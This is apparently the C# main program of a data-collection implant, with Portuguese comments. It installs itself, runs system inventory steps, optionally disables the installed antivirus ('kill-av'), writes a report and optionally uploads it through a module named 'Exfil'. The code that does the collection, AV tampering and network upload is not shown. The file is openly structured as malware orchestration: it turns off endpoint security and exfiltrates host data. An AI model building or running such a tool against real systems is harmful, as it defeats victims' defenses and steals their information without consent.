using System.Diagnostics;
using Teste.Core;
using Teste.Enforce;
using Teste.Exfil;

namespace Teste;

internal static class Program
{
    private static int Main(string[] args)
    {
        var f = args.Select(a => a.TrimStart('-').ToLowerInvariant()).ToHashSet();

        // instalacao antes de qualquer coleta: quem instala nao coleta
        if (f.Contains("uninstall")) return Installer.Uninstall();
        if (f.Contains("install")) return Installer.Install();

        try
        {
            Flags.Parse(args);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"flags: {ex.Message}");
            return 2;
        }

        var log = new Logger(f.Contains("debug"));
        var r = Report.New();
        var all = Stopwatch.StartNew();
        var executed = new List<string>();
        AvGuard? guard = null;
        string dir = "";

        try
        {
            foreach (var step in Steps.All(log))
            {
                if (!Steps.Wanted(step.Key)) { log.Line($"[pula]  {step.Key}"); continue; }

                var sw = Stopwatch.StartNew();
                try
                {
                    step.Collect(r);
                    executed.Add(step.Key);
                    log.Line($"[ok]    {step.Key,-10} {sw.ElapsedMilliseconds,6} ms");
                }
                catch (Exception ex)
                {
                    r.Errors.Add(new ErrorRec(step.Key, $"{ex.GetType().Name}: {ex.Message}"));
                    log.Line($"[falha] {step.Key,-10} {ex.GetType().Name}: {ex.Message}");
                }

                // age depois do inventario: o guard precisa da lista de alvos para existir
                if (step.Key == "antivirus" && f.Contains("kill-av"))
                {
                    try
                    {
                        guard = new AvGuard(log).Disable(r);
                        log.Line($"[av]    {r.AvAction}");
                    }
                    catch (Exception ex)
                    {
                        guard = null;
                        r.Errors.Add(new ErrorRec("antivirus", $"AvGuard.Disable: {ex.Message}"));
                        log.Line($"[av]    falhou: {ex.GetType().Name}: {ex.Message}");
                    }
                }
            }
        }
        // um step que explode fora do catch (StackOverflow em arvore funda, OOM em header
        // de 512 KB) nao pode custar o relatorio do que ja foi coletado.
        finally
        {
            r.Finish();
            r.ScanSeconds = Math.Round(all.Elapsed.TotalSeconds, 2);

            try
            {
                dir = ReportWriter.Write(r, executed);
            }
            catch (Exception ex)
            {
                r.Errors.Add(new ErrorRec("relatorio", ex.Message));
                log.Line($"[falha] relatorio: {ex.GetType().Name}: {ex.Message}");
            }

            // so existe reversao se houve acao. Um Restore que joga nao pode apagar
            // o relatorio que acabou de ser escrito.
            if (guard is not null)
            {
                try { guard.Restore(r); }
                catch (Exception ex) { r.Errors.Add(new ErrorRec("av", $"Restore: {ex.Message}")); }

                try { dir = ReportWriter.Write(r, executed); }   // mesma pasta: o nome sai de r.StartedAt
                catch (Exception ex) { r.Errors.Add(new ErrorRec("relatorio", $"pos-restore: {ex.Message}")); }
            }

            // rede cai; uma falha de exfiltracao nao pode custar o caminho local
            if (f.Contains("send"))
            {
                try { Uploader.Send(r, log); }
                catch (Exception ex)
                {
                    r.Errors.Add(new ErrorRec("upload", $"{ex.GetType().Name}: {ex.Message}"));
                    log.Line($"[falha] upload: {ex.Message}");
                }
            }

            // unica linha que o terminal recebe numa execucao normal
            if (!string.IsNullOrEmpty(dir)) Console.WriteLine(dir);

            if (f.Contains("json")) Console.WriteLine(r.ToJson(true));
        }

        return 0;
    }
}
